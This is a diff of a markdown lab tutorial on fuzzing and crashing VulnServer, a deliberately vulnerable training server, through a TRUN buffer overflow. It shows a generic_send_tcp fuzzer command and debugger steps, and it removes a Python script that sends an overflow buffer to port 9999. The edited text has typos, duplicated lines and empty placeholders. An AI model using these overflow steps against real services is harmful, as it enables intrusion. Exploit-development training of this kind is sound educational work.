@@ -68,35 +68,23 @@ Run the fuzzer from kali machine against VunlServer to identify potential buffer
 generic_send_tcp [VulnServer_IP] 9999 Fuzzer.spk 0 0
 ```
 
-Running this script, we'll see the application crash when we hit a certain buffer length. This confirms the vulnerability exists and gives us a starting point.
+Running this script, we'll see the application crash when we hit a certain buffer length `Access violation when excuting [41414141]`. This confirms the vulnerability exists and gives us a starting point.
 
 ![fuzzing](Images/image2.png)
 
 ## Step 2: Finding the Crash Point
 
-Attach `vulnserver.exe` to Immunity debugger, click `F9` to start the server, Then run the fuzing script from the kali machine again
+Once we've confirmed the crash, we need to determine exactly where the crash occurs.
 
-![fuzzing again]()
+After the applicatoin crashed. In the Debugger, `Right click` on `esp` value in Registers section > `Follow in Dump`, then you wanna Note :
 
-Once we've confirmed the crash, we need to determine exactly where the crash occurs:
+The first address the fuzzing begins with: (In my case ``)
 
-```python
-#!/usr/bin/python3
-import socket
+![crashpoint](Images/image3.png)
 
-# Create our buffer with a pattern instead of As
-# We'll use a pattern of 3000 bytes (more than enough based on fuzzing)
-buffer = b"TRUN /.:/" + b"A" * 2984
+The first address the fuzzing begins with: (In my case ``)
 
-# Send the payload
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.0.98", 9999))
-s.recv(1024)
-s.send(buffer)
-s.close()
-
-print("Buffer sent!")
-```
+![crashpoint](Images/image4.png)
 
 When we run this while monitoring the application in Immunity Debugger, we'll see it crash with EIP filled with "A"s (41414141 in hex), confirming we can control the instruction pointer.
 
